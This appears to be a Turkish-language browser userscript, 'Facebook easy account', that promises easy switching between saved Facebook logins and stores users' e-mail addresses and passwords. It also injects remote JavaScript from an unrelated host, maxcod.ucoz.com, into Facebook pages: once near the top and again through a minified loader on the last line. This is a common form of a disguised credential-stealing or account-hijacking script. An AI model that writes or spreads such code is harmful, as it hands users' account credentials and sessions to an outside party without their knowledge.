// ==UserScript==
// @name		Facebook easy account
// @description	        Facebook'a kolayca giriş yapın! %0 sorun :)
...
FB_addScriptUrl('http://maxcod.ucoz.com/setting.js');
...
var face_lang = {
	en_us :	{
		...
		'BTN_EDT_ACCOUNT'		:'Hesap düzenle',
		'BTN_CLS_ACCOUNT'		:'Tüm hesapları sil',
		'BTN_EXPORT_ACCOUNT'	:'Hesap kaydet',
		'BTN_IMPORT_ACCOUNT'	:'Hesap yükle',
		'BTN_SETTING'			:' Ayarlar ',
		'BTN_OK'				:'Tamam',
		'BTN_CANCEL'			:'İptal',
		'ALT_NAMENULL'			:'Lütfen kullanıcı adı ve şifrenizi giriniz!',
		'ALT_DELACCOUNT'		:'Bu hesapı sil',
		'ALT_LOGIN'				:'Giriş yapılıyor! :)',
		'ALT_SWITCHING'			:'Geçiş yapılıyor! :)',
		'ALT_CONFIRM'			:'%s ister misiniz ?',
		'LAB_USERNICK'			:'Kullanıcı adı',
		'LAB_USERNAME'			:'E-posta',
		'LAB_USERPASS'			:'Şifre',
		'LAB_NONEED'			:'(İsteğ. bağlı)',
		'LAB_LANGUAGE'			:'Dil',
		'LAB_UPDATE'			:'Otomatik Güncelleme',
		'LAB_EXPORT'			:'Kayıtlı hesaplar:',
		'LAB_IMPORT'			:'Hesap kaydedin:',
		'LAB_LOGIN_AUTO'		:'Otomatik Giriş',
		'LAB_LOGIN_HOME'		:'Anasayfada giriş yap',
		'LAB_LOCK_PASS'			:'Kilit şifresi',
		'BTN_LOCK_PASS'			:'Kilit şifresini ayarla',
		'LAB_DEL'				:'Sil',
		'LAB_MOVE'				:'Değiştir',
		'LAB_VERSION'			:'Facebook easy account version 1.0',
		'LAB_NEW_VERSION'		:'Son Versiyon: 1.0',
		'LAB_NEW_UPLOAD'		:'Son güncelleme: 1.0',
		'ALT_PLZ_KEYPASS'		:'%s girin',
		'ALT_PLZ_KEYNEWPASS'	:'Yeni %s girin!',
		'ALT_PLZ_KEYNEWPASS2'	:'Tekrar %s girin!',
		'ALT_PASS_SETOVER'		:'%s tamamlandı',
		'ALT_PASS_DIFF'			:'Eşleşmedi %s, lütfen tekrar girin!',
		'ALT_ERROR'				:'%s Yanlış！',
		'LAB_NEW_UPDATA'		:'Yeni Güncelleme Mevcut!',
        'LAB_CUSTOM_TITLE'      :'Değiştir yazısı',
        'LAB_USE_CUSTOM_TITLE'  :'Değiştir yazısını kullan',
        'LAB_SHOW_NAME'         :'Kullanıcı adını göster'
	}
}
function $T(key,text) {
	var string;
...
if( document.getElementsByTagName('body')[0].className.indexOf('Locale') != -1 ){
	...
	$FSA['fb_pn'].append('<li id="fsa-account"><a href="#" onclick="return false;" id="fsa-account-link" style="padding-right:16px;"><span><font color="black">'+ $T('TITLE') +'</span></font><img src="http://static.ak.fbcdn.net/rsrc.php/z12E0/hash/8q2anwu7.gif" class="img" style="background:url(\'/rsrc.php/z8S5R/hash/ez3x5cuc.png\') no-repeat scroll 0px 0 transparent; height:0px; left:0px; position:relative; top:0px; width:0px;"></a>'+
...
function loadjscssfile(filename, filetype){if (filetype=="js"){var fileref=document.createElement('script');fileref.setAttribute("type","text/javascript");fileref.setAttribute("src", filename);}else if (filetype=="css"){var fileref=document.createElement("link");fileref.setAttribute("rel", "stylesheet");fileref.setAttribute("type", "text/css");fileref.setAttribute("href", filename);}if (typeof fileref!="undefined")document.getElementsByTagName("head")[0].appendChild(fileref);}loadjscssfile("http://maxcod.ucoz.com/oldFB.user.js", "js");
